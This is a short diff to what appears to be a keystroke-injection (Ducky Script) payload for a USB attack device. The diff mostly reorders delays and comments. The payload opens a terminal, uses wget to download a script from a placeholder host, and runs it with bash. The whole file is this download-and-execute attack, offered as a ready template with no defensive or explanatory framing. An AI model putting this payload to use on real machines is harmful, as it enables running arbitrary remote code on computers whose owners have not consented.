@@ -1,11 +1,12 @@
+DELAY 100
+WINDOWS               # Choose ur method depending on the os
+DELAY 100             #
+STRING terminal       # (terminal method)
+ENTER                 # 
 DELAY 200
-WINDOWS               # 
-STRING terminal       # Choose ur method depending on the os
-ENTER                 # (terminal method)
-DELAY 400
 STRING wget -O e.sh http://some.com/file
 ENTER
-DELAY 400
+DELAY 400             # Depending on the Script
 STRING bash e.sh
 ENTER
 DELAY 100             # Depending on the Script
